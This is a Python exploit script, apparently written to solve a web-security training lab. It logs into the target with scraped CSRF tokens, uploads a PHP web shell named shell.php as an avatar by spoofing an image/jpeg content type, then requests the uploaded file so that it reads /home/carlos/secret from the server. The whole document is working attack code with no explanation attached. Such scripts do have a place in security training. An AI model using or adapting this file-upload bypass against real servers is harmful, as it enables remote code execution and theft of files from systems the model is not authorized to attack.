import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup

base_url = input('Enter your lab url: ')
login_url = urljoin(base_url, '/login')
upload_url = urljoin(base_url, '/my-account/avatar')

account = {'user': 'wiener', 'pass': 'peter'}

file_name = "shell.php"
file_content = "<?php echo file_get_contents('/home/carlos/secret'); ?>"
content_type = "image/jpeg"

s = requests.Session()

def login(username: str = account['user'], password: str = account['pass']) -> requests.Response:
    print(f"[+] Logging into {login_url}")
    payload = {
        'username': username,
        'password': password
    }
    r = s.get(login_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find("input", {'name':'csrf'})
    if csrf_input:
        token = csrf_input['value']
        payload['csrf'] = token
    r = s.post(login_url, payload)
    if "Log out" in r.text:
        print("[+] Logged Successfully!!!")
        return r
    else:
        print("[-] Logged failed!!!")
        return None

def upload_shell(site: requests.Response):
    print(f"[+] Uploading {file_name}")
    file = {
        'avatar': (file_name, file_content, content_type)
    }
    payload = {
        'user': account['user']
    }
    soup = BeautifulSoup(site.text, 'html.parser')
    csrf_input = soup.find('input', {'name':'csrf'})
    if csrf_input:
        token = csrf_input['value']
        payload['csrf'] = token
    r_post = s.post(upload_url, files=file, data=payload)
    print(r_post.text)
    soup = BeautifulSoup(r_post.text, 'html.parser')
    r_get = s.get((urljoin(base_url, soup.find('a')['href'])))
    soup = BeautifulSoup(r_get.text, 'html.parser')
    r_get = s.get((urljoin(base_url, soup.find('img', class_='avatar')['src'])))
    print(r_get.text)

if __name__ == "__main__":
    site = login()
    if site:
        upload_shell(site)
